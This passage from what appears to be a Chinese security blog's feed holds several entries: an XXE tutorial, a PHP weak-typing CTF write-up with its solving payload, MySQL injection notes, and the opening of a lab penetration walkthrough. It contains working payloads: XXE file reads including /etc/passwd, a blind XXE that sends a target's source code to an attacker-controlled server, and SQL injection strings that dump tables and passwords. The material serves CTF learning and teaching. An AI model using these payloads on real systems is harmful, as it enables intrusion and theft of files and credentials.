<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///c://target.txt"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
<p>将payload进行url编码，然后攻击<br><img src="http://ourd90bac.bkt.clouddn.com/xxe1.jpg" alt=""><br>读取目标文本。</p>
<p>这是在win下，如果换在<code>linux</code>下我们可以直接用于读取用户密码<code>file:///etc/passwd</code></p>
<p>接下来进行读取php文件，需要注意的是，因为php中含有<code>&lt;,&gt;</code>这样的括号，所以会和xml代码有冲突，所以在读取php、html文档时会导致解析错误。如果要正确读取php文档，我们可以用php中的<code>php://filter</code>协议。<br>payload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=test.php"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://ourd90bac.bkt.clouddn.com/xxe2.jpg" alt=""><br><img src="http://ourd90bac.bkt.clouddn.com/xxe3.jpg" alt=""></p>
<h3 id="3-2-Blind-XXE"><a href="#3-2-Blind-XXE" class="headerlink" title="3.2 Blind XXE"></a>3.2 Blind XXE</h3><p>当源码为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div></pre></td></tr></table></figure></p>
<p>也就是没有了回显，这种时候该怎么办呢？接下来就需要vps作为辅助了。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=test.php"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %all;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure>
<p>vps上的xxe.xml：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;&gt;"&gt;</div></pre></td></tr></table></figure></p>
<p>上述代码在DTD中定义了一个<code>file</code>实体和<code>dtd</code>实体，其中<code>file</code>实体是我们要读取的目标服务器网站的源码。<code>dtd</code>实体是引用vps上的xxe.xml文件。之后我们先引用<code>dtd</code>实体，然后在xxe.xml文件中的<code>all</code>实体，进而调用<code>send</code>实体，再调用payload中的<code>file</code>实体。最终构成了一条从vps上访问目标网站的请求,从而可以从vps上的日志直接看到目标网站上的目标文件源码。</p>
]]></content>
      
        
        <tags>
            
            <tag> 注入 </tag>
            
            <tag> XML </tag>
            
            <tag> 源码读取 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF中的php弱类型]]></title>
      <url>/2017/10/10/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      <content type="html"><![CDATA[<h1 id="PHP弱类型在CTF中的应用"><a href="#PHP弱类型在CTF中的应用" class="headerlink" title="PHP弱类型在CTF中的应用"></a>PHP弱类型在CTF中的应用</h1><p><img src="http://ourd90bac.bkt.clouddn.com/14.jpg" alt=""></p>
<blockquote>
<p>如果你经常接触到CTF比赛，那么你一定对php代码审计的题不会陌生。本篇文章将由CTF比赛引申对php弱类型进行一些总结。</p>
</blockquote>
<a id="more"></a>
<h2 id="基础引入"><a href="#基础引入" class="headerlink" title="基础引入"></a>基础引入</h2><h3 id="什么是php弱类型"><a href="#什么是php弱类型" class="headerlink" title="什么是php弱类型"></a>什么是php弱类型</h3><p>php在变量的声明时不需要直接声明变量的类型，而变量的类型是由程序的上下文决定的。</p>
<h3 id="数据转换"><a href="#数据转换" class="headerlink" title="数据转换"></a>数据转换</h3><p>php中只存在，整型、浮点型、布尔、NULL型变量的转换。但是特别注意，一般在自动转换时通常是后两者转换为前两者。</p>
<p>布尔值参与运算时，TRUE转换为整型1，FALSE转换为整型0运算。</p>
<p>有NULL只参与运算时，NULL转换为整型0进行运算。</p>
<p>有整型与浮点型参与运算时，将整型转换为浮点型进行运算。</p>
<p>有字符串型与数字类型的数据进行运算时，将字符串转换为数字类型进行运算。如：<br>“123abc”转化为123,”123.456abc”转换为123.456，”abc”转换为整型0。</p>
<h3 id="php中的运算符"><a href="#php中的运算符" class="headerlink" title="php中的运算符"></a>php中的运算符</h3><p>首先看如下代码：</p>
<pre><code>&lt;?php
$a = 0;

var_dump( $a &gt; 0);
var_dump( $a &lt; true);
var_dump( $a &gt;= 0.01);
var_dump( $a &lt;= &quot;0.10yuan&quot;);
var_dump( $a = 0);
var_dump( $a == 0);
var_dump( $a == &quot;0&quot;);
var_dump( $a === &quot;0&quot;);
var_dump( $a === 0);
var_dump( $a &lt;&gt; 0);
var_dump( $a != 0);
var_dump( $a != 1);
?&gt;
</code></pre><p>输出如下：<br>  <img src="http://ourd90bac.bkt.clouddn.com/php.jpg" alt=""></p>
<p>可见当<code>$a == &quot;0&quot;</code>输出正确，而<code>$a === &quot;0&quot;</code>却是错误的。这是为什么呢？原因就在于php中“==”与“===”的区别。前者是一种模糊等于，只会比较内容的值，不会比较内容的类型，也就是后面提到了松散比较。而后者是一种严格的等于判断，会将内容与内容类型都进行判断。这是php作为弱类型语言的一种特点。</p>
<p>接下来将用一道CTF题来了解下实际情况中常见的php弱类型。</p>
<h2 id="php源码分析"><a href="#php源码分析" class="headerlink" title="php源码分析"></a>php源码分析</h2><blockquote>
<p>整型与字符串的纠葛<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">show_source(<span class="keyword">__FILE__</span>); </div><div class="line">$a=<span class="number">0</span>; </div><div class="line">$b=<span class="number">0</span>; </div><div class="line">$c=<span class="number">0</span>; </div><div class="line">$d=<span class="number">0</span>; </div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>])) </div><div class="line">&#123; </div><div class="line">        $x1 = $_GET[<span class="string">'x1'</span>]; </div><div class="line">        $x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        <span class="keyword">switch</span> ($x1) </div><div class="line">        &#123; </div><div class="line">        <span class="keyword">case</span> <span class="number">0</span>: </div><div class="line">        <span class="keyword">case</span> <span class="number">1</span>: </div><div class="line">                $a=<span class="number">1</span>; </div><div class="line">                <span class="keyword">break</span>; </div><div class="line">        &#125; </div><div class="line">&#125; </div><div class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]); </div><div class="line"><span class="keyword">if</span>(is_array($x2))&#123; </div><div class="line">    is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">    <span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123; </div><div class="line">        ($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>; </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123; </div><div class="line">        <span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>); </div><div class="line">        $p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]); </div><div class="line">        $p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        <span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123; </div><div class="line">            $val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>; </div><div class="line">        &#125; </div><div class="line">        $c=<span class="number">1</span>; </div><div class="line">&#125; </div><div class="line">&#125; </div><div class="line">$x3 = $_GET[<span class="string">'x3'</span>]; </div><div class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123; </div><div class="line">    <span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123; </div><div class="line">        <span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123; </div><div class="line">            $d=<span class="number">1</span>; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123; </div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </div><div class="line">    <span class="keyword">echo</span> $flag; </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
</blockquote>
<p>首先通读全部代码，这里得到flag的条件是变量<code>$a、$b、$c、$d</code>的值都要等于1。</p>
<h3 id="分步解题"><a href="#分步解题" class="headerlink" title="分步解题"></a>分步解题</h3><ul>
<li><code>$a = 1</code></li>
</ul>
<p>要使变量等于1，要经过两层比较。首先在<code>$x1 == 1</code>的松散比较中要不等于”1”，这个很好过，任意不为1的值都可以。然后将<code>NULL</code>赋给<code>$x1</code>。接着进行了一次<code>switch</code>语句的比较。按照官方文档的说法,Switch中为确保精度，建议只使用比较整型和字符串。但由于php弱语言的缘故，所以也可以使用任意类型进行比较。那么这里我们<code>$x1</code>为<code>NULL</code>值就会和整型0进行一次松散的双等比较，于是为<code>true</code>。最终<code>$a = 1</code>。</p>
<ul>
<li><code>$b = 1</code>与<code>$c = 1</code></li>
</ul>
<p>源代码程序继续往下读，首先<code>json_decode</code>将传入的<code>$x2</code>数据进行json格式编码，说明我们需要传入一个数组，用的是json格式。接着<code>is_numeric</code>和与整型2017的判断是php弱类型题中的典型判断。由前面提到的整型与字符串型的比较知识中我们不难构造”2018a”这样的形式来绕过这里的判断使<code>$b = 1</code>。接着使用<code>array_search</code>函数对<code>$x2[&quot;x22&quot;]</code>进行匹配。但是同样的，在php函数中<code>array_search</code>函数进行的匹配也是通过松散的双等比较进行的，这里如果数组里有一个0值，字符串”XIPU”就会通过双等自动转换为0，从而匹配成功。综上，所以我们这里构造payload为<code>x2={&quot;x21&quot;:&quot;2018a&quot;;&quot;x22&quot;:[[1],0]}</code>就可以成功绕过了。</p>
<ul>
<li><code>$c = 1</code></li>
</ul>
<p>这里运用的是php中0e弱类型比较，只要是0e开头的字符串在双等的松散判断下都是相等的，这里涉及md5加密，直接截取它的代码，修改下成小脚本跑一下就出来了。</p>
<p>全部的payload为：<code>?x1=a1&amp;x2={&quot;x21&quot;:&quot;2018a&quot;,&quot;x22&quot;:[[1],0]}&amp;x3=XIPU18570</code></p>
<p><strong>小结</strong>：以上的弱类型转换中是整型与字符串类型的转换。</p>
<blockquote>
<p>数组与字符串的纠葛</p>
</blockquote>
<p>看以下源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"You in,You win"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"Get out!"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>源码中使用<code>strcmp</code>函数对变量<code>$c</code>与<code>$d</code>进行比较，其特点是将两个变量转换为ascii码后进行前者减后者，并返回一个int类型的相减后的结果。这样我们不难发现，<code>strcmp</code>在比较数字类型与字符串类型时，返回的数据都是正常的，但是一旦遇到其中数组类型的比较呢？答案是NULL<br>所以我们这里构造数组与其比较就会构造成恒为真，从而绕过判断，进入if中。</p>
<p><strong>补充</strong>：php中数组转换成其他类型的后的值：</p>
<p>Array转换整型int/浮点型float会返回元素个数；<br>转换bool返回Array中是否有元素；转换成string返回’Array’，并抛出warning。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从上面这个例子可以看出php弱类型的成因在其对数据类型的处理上，体现在存在双等松散比较的条件判断与函数判断中。</p>
<p>其实php对字符串的自动转化相当于使用<code>intval()</code>函数对字符串进行强制转换，只要存在字符串与数字类型的双等松散比较中就存在这种强制转换。造成这种现象的原因就在于php内核中对弱类型的封装，其存在于<code>zval</code>结构中：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _zval_struct zval;</div><div class="line">	<span class="keyword">struct</span> _zval_struct &#123;  </div><div class="line">    <span class="comment">/* Variable information */</span>  </div><div class="line">    zvalue_value value;     <span class="comment">/* value */</span>  </div><div class="line">    zend_uint refcount__gc;  </div><div class="line">    zend_uchar type;    <span class="comment">/* active type */</span>  </div><div class="line">    zend_uchar is_ref__gc;  </div><div class="line">	&#125;;  </div><div class="line"></div><div class="line">	<span class="keyword">typedef</span> <span class="keyword">union</span> _zvalue_value &#123;  </div><div class="line">    <span class="keyword">long</span> lval;  <span class="comment">/* long value */</span>  </div><div class="line">    <span class="keyword">double</span> dval;    <span class="comment">/* double value */</span>  </div><div class="line">    <span class="keyword">struct</span> &#123;  </div><div class="line">        	<span class="keyword">char</span> *val;  </div><div class="line">        	<span class="keyword">int</span> len;  </div><div class="line">    	&#125; str;  </div><div class="line">    HashTable *ht;  <span class="comment">/* hash table value */</span>  </div><div class="line">    zend_object_value obj;  </div><div class="line">	&#125; zvalue_value;</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> CTF </tag>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySql 注入杂记]]></title>
      <url>/2017/10/06/MySQL%E6%B3%A8%E5%85%A5%E6%9D%82%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="MySQL注入杂记"><a href="#MySQL注入杂记" class="headerlink" title="MySQL注入杂记"></a>MySQL注入杂记</h1><p><img src="http://ourd90bac.bkt.clouddn.com/mysql.jpg" alt=""></p>
<h2 id="1-基础知识准备："><a href="#1-基础知识准备：" class="headerlink" title="1.基础知识准备："></a>1.基础知识准备：</h2><h3 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h3><ul>
<li>基于从服务器的响应：<br>1.基于错误的sql注入；<br>2.联合查询的类型；<br>3.SQL盲注：<pre><code>基于布尔的盲注
基于时间的盲注
基于报错的盲注
</code></pre><a id="more"></a></li>
<li><p>基于注入的数据类型：<br>1.基于字符串<br>2.基于数字</p>
</li>
<li><p>基于程度和顺序<br>1.一阶注入；<br>2.二阶注入；<br>3.</p>
</li>
<li>基于注入位置<br>1.基于用户输入表单域的注入；<br>2.通过cookie注入；<br>3.通过服务器变量注入。（基于头部信息注入）</li>
</ul>
<h3 id="MySQL系统函数"><a href="#MySQL系统函数" class="headerlink" title="MySQL系统函数"></a>MySQL系统函数</h3><p>1.version() :mysql版本信息<br>2.user():数据库用户名<br>3.database():数据库名<br>4.@@datadir():数据库路径<br>5.@@version_compile_os():操作系统版本</p>
<p>###函数介绍<br>1.concat(str1,str2,….):没有分隔符地连接字符串<br>2.concat_ws(separator.str1,str2,…)含有分隔符地连接字符串<br>3.group_concat(str1,str2,…):连接一族所有的字符串，并用逗号分隔</p>
<h2 id="2-GET联合查询（有回显报错）"><a href="#2-GET联合查询（有回显报错）" class="headerlink" title="2.GET联合查询（有回显报错）"></a>2.GET联合查询（有回显报错）</h2><p>1.测试<code>id</code>值后的闭合符号，以及注释符。</p>
<blockquote>
<p>常见注释：<br>–+<br>#<br>`</p>
</blockquote>
<p>2.<code>order by</code>联合查询，找出相应的列数</p>
<p>3.<code>union select</code>联合查询注入。如下：</p>
<p><strong>查询所有数据库</strong>：<code>id=-1&#39; union select 1, group_concat(table_schema),3 from information_schema.schemata--+</code></p>
<p>注：这里我们假设查询出<code>security</code>数据库</p>
<p><strong>查询表名（table）</strong>：<code>id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
<p><strong>查询列名（column）</strong>：<code>id=-1&#39; union select 1, group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
<p><strong>查询字段名</strong>：<code>id=-1 union select 1,username,password from users where id=2--+</code></p>
<p>##3. GET报错注入（无回显）<br>此种注入时区别于上一种联合查询的有回显报错的，此种无回显报错注入只能用到另外的函数来进行报错回显注入。</p>
<ul>
<li><p><code>extractvalue</code><br>其核心的语句大家都应该能看出是<code>select</code>后查询语句。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#爆数据库</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select database())))-- </div><div class="line">#爆表</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- </div><div class="line">#爆列</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1)))-- </div><div class="line">#爆字段</div><div class="line">and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))--</div></pre></td></tr></table></figure>
</li>
<li><p><code>updatexml</code><br>与上面的<code>extractvalue</code>相差不大</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">and 1=(updatexml(0x3a,concat(1,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>))<span class="comment">--</span></div></pre></td></tr></table></figure>
</li>
<li><p><code>floor</code><br>同上</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">union+<span class="keyword">select</span>+<span class="number">1</span>+<span class="keyword">from</span>+(<span class="keyword">select</span>+<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),(<span class="keyword">select</span>+table_name+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">where</span>+table_schema=<span class="keyword">database</span>()+<span class="keyword">limit</span>+<span class="number">0</span>,<span class="number">1</span>))a+<span class="keyword">from</span>+information_schema.tables+<span class="keyword">group</span>+<span class="keyword">by</span>+a)b</div></pre></td></tr></table></figure>
</li>
</ul>
<p>##4. 盲注的相关知识</p>
<ul>
<li>基于布尔盲注—–构造逻辑结构判断</li>
</ul>
<p>相关字符串截取函数：<br>1.<code>left(database(),1)&gt;&#39;s&#39;</code>   ：database()显示数据库名，left(a,b)从左侧截取a的前b位<br>2.<code>ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1)1,1)--+</code>：substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。</p>
<blockquote>
<p><code>substr()</code>的小技巧：例如在<code>substr(database(),1,1)</code>中逗号被过滤了，我们可以使用<code>from 1 to 1</code>来绕过过滤。<br>那么有同样格式的<code>limit 0,1</code>有没有这样的绕过呢？当然有。格式为：<code>1 offset 0</code>这里注查询数字的顺序。</p>
</blockquote>
<p>3.<code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER
BY id LIMIT 0,1),1,1))&gt;98%23</code>: mid(a,b,c)从位置b开始，截取字符串a的c位。ord()函数和ascii()函数一样将字符转为ascii码。</p>
<ul>
<li>基于报错的MySQL盲注</li>
<li>基于时间的盲注<br><code>if(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</code>if(a,b,c)若a成立，就执行c，不成立就执行b</li>
</ul>
<h3 id="GET布尔盲注"><a href="#GET布尔盲注" class="headerlink" title="GET布尔盲注"></a>GET布尔盲注</h3><ul>
<li><p>判断数据库<br>可以使用两种函数判断：<br>1.<code>id=1&#39; and left(database(),1)=&#39;s&#39;--+</code>：直接判断数据库的名字，缺点就是受限于left函数的用法，不能进行每一位的单个字符的判断。<br>2.<code>id=1&#39; and ascii(substr(database(),1,1))=89--+</code>：和上面的语句一样用于判断数据库名，在使用脚本时用此句就行。</p>
</li>
<li><p>爆数据库下的表名<br><code>id=1&#39; and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=136--+</code><br><em>解释</em>：<code>limit 0,1</code>中0是表示从第一个表（若数据库有多个表）开始，接着的1表示获取第一个。</p>
</li>
<li><p>获取字段内的值（获取字段名就和上面获取表名的操作是一样的）<br>假设我们从上一步的操作中获取了一个名叫<code>users</code>的字段，一般想来这个字段中肯定含有我们想要得到的用户名和密码，所以这里就可以用到正则注入。</p>
</li>
</ul>
<p>1.<code>id=1&#39; and 1=(select 1 frominformation schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^us[a-z]&#39; limit 0,1)--+</code></p>
<p><strong>注意</strong>：select后的1表示我们查询的是这个字段的第一个值，若我们想查询其他字段中的值，直接更换这里的’users’即可，所以这里的limit 0,1起不到限定作用，可有可无。</p>
<p>2.使用<code>ord()</code>与<code>mid()</code>函数</p>
<p>解释：这里的mid()函数与substr()函数类似，有一样的功能。函数原型为：<code>MID(ColumnName, Start [, Length])</code>对字符串从start位置开始截取相应的长度。这里我就可以在substr()被禁的情况下做替换。</p>
<h2 id="4-POST注入"><a href="#4-POST注入" class="headerlink" title="4.POST注入"></a>4.POST注入</h2><p>常见的Post注入分为两类：</p>
<ol>
<li><p>同时验证用户名和密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$sql = select * from users where username=$usernmae <span class="keyword">and</span> password=$password limit <span class="number">1</span>,<span class="number">1</span></div><div class="line">$result = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>($result) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"登陆失败"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>用户名与密码分步验证</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="string">"select password from users where username='$username'"</span></div><div class="line">$result = mysql_query($sql);</div><div class="line"><span class="keyword">if</span>($result) &#123;</div><div class="line">    $row = mysql_fetch_row($result);</div><div class="line">    $query_password = $row[$password];</div><div class="line">    <span class="comment">#对输入的$password进行变形</span></div><div class="line">    $input_password = modify($passowrd);</div><div class="line">    <span class="keyword">if</span>($input_password == $query_password) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"登陆成功"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"密码错误"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"用户不存在"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p>我们在大多数情况下遇到的都是第一种情况，其实第一种情况与第二种情况并无太大区别，就是在查询成功后页面返回不同而已。其余的都和普通的注入一样。这里就不再反复赘述。</p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> CTF </tag>
            
            <tag> Mysql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Blackb0x 服务器渗透]]></title>
      <url>/2017/08/16/Blackb0x-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F/</url>
      <content type="html"><![CDATA[<h1 id="一次虚拟机服务器的内网渗透"><a href="#一次虚拟机服务器的内网渗透" class="headerlink" title="一次虚拟机服务器的内网渗透"></a>一次虚拟机服务器的内网渗透</h1><p><img src="http://ourd90bac.bkt.clouddn.com/timg.jpg" alt=""></p>
<blockquote>
<p>D0g3第三次测试的题目，整个题目拥有7个<em>flag</em>。目标主机是一个Windows2003虚拟机，登录密码非弱口令，无法通过字典爆破的形式进行简单的进入，需进行常规的内网渗透程序进行渗透。</p>
</blockquote>
<hr>
<a id="more"></a>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ul>
<li><strong>获取目标IP</strong><blockquote>
<p>建议VM虚拟机使用桥接的方式，<em>kali</em>虚拟机也是用桥接模式，这样在一个网段才能扫到IP，实验也更贴近实战。</p>
</blockquote>
</li>
</ul>
<p>使用<strong>kali Linux</strong>。终端 <em>netdiscover</em>命令获取同网段的主机IP(192.168.2.116)</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/Kali.png" alt=""></p>
<ul>
<li><strong>端口扫描</strong></li>
</ul>
<p>使用<em>zenmap</em>（nmap的图形化版本）进行端口扫描，扫描参数使用默认的就可以了。扫描结果如下：</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag1-1.png" alt=""></p>
<p>从扫描结果可以发现开放了： 21/tcp、80/tcp端口，这两个服务分别对应着<a href="https://baike.baidu.com/item/ftp/13839?fr=aladdin" target="_blank" rel="external">文件传输协议</a>与<a href="https://baike.baidu.com/item/http/243074?fromtitle=%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE&amp;fromid=8535513" target="_blank" rel="external">web</a>服务，即服务器设有网站，并且还发现了一个<em>phpinfo()</em>页面。打开后获得第一条<em>flag</em>。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag1-2.png" alt=""></p>
<p>于是现在就提供了两条思路。1.通过ftp协议进行远程访问，获取服务器的有用信息；2.通过找到服务器搭载的网站进行渗透，getshell后进行提权拿到服务器。</p>
<ul>
<li><strong>目录扫描</strong></li>
</ul>
<p>既然开了80端口，就不得不扫一波目录了。</p>
<p><img src="http://ourd90bac.bkt.clouddn.com/flag2-1.png" alt=""></p>
<p>果然发现有收获：点进<em>192.168.2.116/ftp.rar</em>得到有个ftp程序的压缩包。解压：</p>
